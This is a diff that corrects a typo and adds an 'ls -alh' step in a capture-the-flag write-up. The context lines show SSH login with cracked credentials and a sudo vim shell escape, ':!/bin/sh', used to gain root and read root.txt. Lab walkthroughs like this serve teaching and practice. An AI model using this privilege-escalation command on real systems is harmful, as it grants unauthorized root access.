@@ -62,7 +62,7 @@ After installing some missing modules (it's a python2 script and using pip insta
 
 ![Cracked](https://i.ibb.co/tZTFTxQ/Cracked.png)
 
-We can no succesfully login to the SSH server on port 2222 with the credentials we just found.
+We can now succesfully login to the SSH server on port 2222 with the credentials we just found.
 
 > What's the user flag?
 
@@ -80,7 +80,7 @@ Looks like we can use `vim` to spawn a privileged shell. Let's check https://gtf
 
 `sudo vim -c ':!/bin/sh'`
 
-`cd /root/`
+`cd /root` then `ls -alh`
 
 `cat root.txt`
 
